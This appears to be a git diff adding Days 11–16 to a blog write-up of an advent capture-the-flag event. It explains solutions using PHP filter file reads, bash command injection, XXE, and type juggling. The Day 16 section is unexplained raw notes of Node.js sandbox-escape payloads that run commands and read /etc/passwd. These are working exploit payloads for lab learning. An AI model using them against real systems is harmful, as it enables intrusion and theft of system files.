@@ -141,4 +141,130 @@ So, PHP uses includes on the user input. We *could* exploit this with a reverse 
 
 ![day10step](/assets/images/advent/day10step.png)
 
-Well, that is great, but we need to get promoted. The second part of the cookie appears to be a hash, a simple online look-up table tells us that this is `user` hashed with sha1. so, what if we hash `admin` with sha1? We end up with the payload `'{"page":"flag","role":"d033e22ae348aeb5660fc2140aec35850c4da997"}'` encoded to `eyJwYWdlIjoiZmxhZyIsInJvbGUiOiJkMDMzZTIyYWUzNDhhZWI1NjYwZmMyMTQwYWVjMzU4NTBjNGRhOTk3In0K`. This gives us the flag `NOVI{LFI_1s_ask1ng_f0r_tr0bl3}`.
+Well, that is great, but we need to get promoted. The second part of the cookie appears to be a hash, a simple online look up table tells us that this is `user` hashed with sha1. so, what if we hash `admin` with sha1? We end up with the payload `'{"page":"flag","role":"d033e22ae348aeb5660fc2140aec35850c4da997"}'` encoded to `eyJwYWdlIjoiZmxhZyIsInJvbGUiOiJkMDMzZTIyYWUzNDhhZWI1NjYwZmMyMTQwYWVjMzU4NTBjNGRhOTk3In0K`. This gives us the flag `NOVI{LFI_1s_ask1ng_f0r_tr0bl3}`.
+
+## Day 11
+
+We get the same page as yesterday, so naturally, I start looking in the same place, the cookies. And behold, another cookie: `eyJwYXRoIjoiLiIsInBhZ2UiOiJtYWluIn0=`, which decrypts to `{"path":".", "page":"main" }`, which is very similar to yesterday. Now we have to find the flag, so I change `main` to `flag`: "Are you trying to get yourself on the naughty list? (no_direct_access)"
+
+Okay, so that does not work, what if we use the path to access it. When we enter a wrong page, we get to see a PHP error stating that the files are saved in `/var/www/html/`, we can use this information. The new payload becomes: `{"path":"..", "page":"html/flag" }`. This time the error is "soo_many_dots". Okay, what if we use the full path, without any dots? `{"path":"/var/www", "page":"html/flag" }`, the same page as yesterday: "Go get promoted!". But how? There is nothing of rights in the cookie. As it turns out, this is not the correct way, it is a file read exploit.
+
+PHP has something called filters, which allow checking data, but can also be used to exfiltrate data. In this case we can use `php://filter/convert.base64-encode/resource=flag` to read `flag.php` as base64 (the `.php` is added by the code). This payload in the page, however returns "blacklist". But, if we split the payload up we get `{"path":"php://filter", "page":"convert.base64-encode/resource=flag" }`. This returns a load of base64, with the flag inside it: `NOVI{LFI_and_st1ll_you_f0und_it}`. And looking at the code, you could never find the flag without reading the code.
+
+## Day 12
+
+Today we get a page that checks the response speed of a webpage for us. After trying some 'bad' characters I got an error at a single quote:
+
+```error
+Something happened: /bin/bash: -c: line 0: unexpected EOF while looking for matching ''' /bin/bash: -c: line 1: syntax error: unexpected end of file
+```
+
+So, this means that the input gets executed in bash! Let's exploit this. Certain characters like `;` are not permitted, but we can execute a command using `$(id)`, so let's try this. Weird, still nothing happens, the check just gets executed. The only output we have seen is from errors, so, maybe only the errors get shown. In bash, the errors are displayed on the `stderr`, so if we pipe the information to `/dev/stderr`, we might be able to read it.
+
+![day12rce](/assets/images/advent/day12rce.png)
+
+Yes! We have an RCE. Okay, now we just read the flag, which can be found in `/flag.txt`, according to the introduction. `NOVI{we_are_halfway_to_christmas!}`.
+
+## Day 13
+
+This page says it shows the result of my POST, so, let's post some data to it. The result is an error: `Uncaught Error: Call to a member function asXML()`. This means that the server probably parses the posted data as XML, so let's try an XXE.
+
+![day13xxe](/assets/images/advent/day13xxe.png)
+
+Oh yeah! Okay, now, let's read the page for the flag:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///var/www/html/index.php" >]>
+<foo>&xxe;</foo>
+```
+
+However, this gives us a series of weird errors, so we need something else. I decided to use the method from yesterday: PHP's filter to get the file:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php" >]>
+<foo>&xxe;</foo>
+```
+
+This gives us a big blob of base64 with `NOVI{<xml>nightmares</xml>}` inside.
+
+## Day 14
+
+Today we get this code on the main page:
+
+```php
+<?php
+
+ini_set('display_errors', 0);
+
+include("flag.php");
+
+if (isset($_POST["password"], $_POST["verifier"])) {
+    $password = $_POST["password"];
+    $verifier = $_POST["verifier"];
+
+    $hash = sha1($password + $secret_salt);
+    $reference = substr($hash, 0, 7);
+
+    if ($verifier === $reference) {
+        echo $flag;
+        die();
+    }
+}
+
+header("Location: /index.php?error=That was not right.");
+exit();
+
+?>
+```
+
+And the option to enter a password and verifier. The page calculates a hash of the password plus a secret unknown salt and checks if the first 7 characters of the hash match the verifier. But wait, it does not concatenate these as strings! The two options are added together as numbers. This means that if both are a string, the result is always 0. But, after testing the hash for 0, this does not work. So, that means that the secret salt is a number. This allows us to overflow the number to a certain value, such as PHP's `INF`. Adding `1e309` as a password does this, the hash of `INF` is `55c1943f65c7c105ae98e6703cd64127b6585656`, so the verifier must be `55c1943`. This gives us the flag: `NOVI{typ3_juggl1ng_f0r_l1fe}`.
+
+## Day 15
+
+This day is very similar to yesterday, with again some code:
+
+```php
+<?php
+
+ini_set('display_errors', 0);
+
+include("flag.php");
+
+if (isset($_POST["flag"])) {
+    $f = $_POST["flag"];
+
+    if (strcmp($f, $flag) == 0 || sha1($flag) == sha1($f)) {
+        echo $flag;
+        die();
+    }
+}
+
+header("Location: /index.php?error=Wrong flag");
+exit();
+
+?>
+```
+
+And just like yesterday, today's exploit is type juggling. The second check uses a loose check, which is true if both values are a string. So, no matter what is entered, the second check is always true. The first check is more difficult, but I found out that `strcmp()` return `NULL` if the entered value is an array. So by modifying the request to send `password[]` with a value of `[]`, the check returns `NULL`, which is considered valid by the check. The flag is `NOVI{typ3_juggl1ng_f0r_l1fe_seriously}`
+
+## Day 16
+
+require('fs').readFileSync('/etc/passwd', 'utf8');
+delete(this.constructor.constructor),delete(this.constructor), this.constructor.constructor('return child_process')().exec('id'))
+
+delete(this.constructor.constructor),delete(this.constructor),this.constructor.constructor('return process')()
+
+delete(this.constructor.constructor),delete(this.constructor),this.constructor.constructor('return process.mainModule.require(\"child_process\").exec(\"id\")')()
+
+delete(this.constructor.constructor),delete(this.constructor),this.constructor.constructor('return fs')().readFileSync('/etc/passwd', 'utf8')
+
+delete(this.constructor.constructor),delete(this.constructor),this.constructor.constructor('return process.mainModule.require(\"fs\")')()
+
+
+;fs.readFileSync(\"/etc/passwd\", \"utf8\")
